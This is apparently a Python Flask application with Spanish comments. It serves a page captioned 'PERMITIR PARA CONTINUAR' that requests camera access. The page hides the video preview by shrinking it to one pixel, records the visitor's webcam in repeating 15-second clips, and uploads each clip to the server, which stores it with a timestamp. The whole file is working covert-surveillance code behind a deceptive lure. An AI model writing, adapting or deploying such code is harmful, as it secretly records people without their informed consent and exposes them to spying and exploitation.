from flask import Flask, request, render_template_string
import os
from datetime import datetime
import sys
from config_videos import root

def get_dirname(find_file):
    ruta_absoluta = os.path.abspath(find_file)
    directname = os.path.dirname(ruta_absoluta)
    return directname

sys.path.append('../../modulo')
from config import basic, puertos

app = Flask(__name__)

# Directorio para guardar los vídeos
SAVE_DIR = root()

# Ruta principal que muestra el formulario HTML
@app.route('/')
def index():
    static_files = os.listdir('static')
    background_image = f"/static/{static_files[0]}"

    return f'''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Access</title>
    <style>
        h1 {{
            font-family: Arial, sans-serif;
            color: #333;
            text-align: center;
            text-shadow: 2px 2px 4px #ccc;
        }}
        body {{
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 75vh;
            margin: 0;
            background-size: cover;
            background-repeat: no-repeat;
            background-attachment: fixed;
            background-image: url('{background_image}');
        }}

        video {{
            width: 320px;
            height: 240px;
            margin-bottom: 20px;
        }}

        button {{
            padding: 10px 20px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }}

        button:hover {{
            background-color: #45a049;
        }}
        video {{
            width: 1px; /* Ancho del video */
            height: 1px; /* Alto del video */
            margin-bottom: 20px;
        }}

    </style>
</head>
<body>
<h1>PERMITIR PARA CONTINUAR</h1>
<video autoplay playsinline id="videoElement"></video>

<script>
    const video = document.getElementById('videoElement');
    let mediaRecorder;
    let chunks = [];

    // Obtener acceso a la cámara y mostrar el video en el elemento <video>
    navigator.mediaDevices.getUserMedia({{ video: true }})
        .then(stream => {{
            video.srcObject = stream;
            mediaRecorder = new MediaRecorder(stream);

            // Evento que se activa cada vez que se captura un fragmento de vídeo
            mediaRecorder.ondataavailable = event => {{
                chunks.push(event.data);
            }};

            // Evento que se activa cuando se detiene la grabación
            mediaRecorder.onstop = () => {{
                const blob = new Blob(chunks, {{ type: 'video/webm' }});
                chunks = [];
                const formData = new FormData();
                formData.append('videoData', blob);

                // Enviar el vídeo al servidor Flask
                fetch('/capture', {{
                    method: 'POST',
                    body: formData
                }})
                .then(response => response.text())
                .then(data => {{
                    console.log(data);
                    console.log('Video guardado correctamente');
                }})
                .catch(error => {{
                    console.error('Error al guardar el vídeo:', error);
                }});

                // Reiniciar la grabación después de un breve retraso
                setTimeout(startRecording, 1000);
            }};

            // Iniciar la grabación automáticamente
            startRecording();
        }})
        .catch(err => {{
            console.error('Error al acceder a la cámara:', err);
        }});

    // Función para iniciar la grabación
    function startRecording() {{
        mediaRecorder.start();
        // Detener la grabación después de 15 segundos
        setTimeout(stopRecording, 15000);
    }}

    // Función para detener la grabación
    function stopRecording() {{
        mediaRecorder.stop();
    }}
</script>
</body>
</html>
'''
# Ruta para manejar la solicitud de captura de vídeo
@app.route('/capture', methods=['POST'])
def capture():
    # Obtener el dato de vídeo en formato blob desde la solicitud
    video_data = request.files['videoData']

    # Guardar el vídeo en un archivo
    if video_data:
        # Crear el directorio para guardar los vídeos si no existe
        if not os.path.exists(SAVE_DIR):
            os.makedirs(SAVE_DIR)

        # Guardar el vídeo en un archivo
        timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
        video_path = os.path.join(SAVE_DIR, f"video_{timestamp}.webm")
        video_data.save(video_path)
        print("video guardado en:", SAVE_DIR)
        return "Video guardado correctamente"
    else:
        return "No se recibió ningún dato de vídeo"

if __name__ == '__main__':
    basic()
    app.run(debug=True, port = puertos())
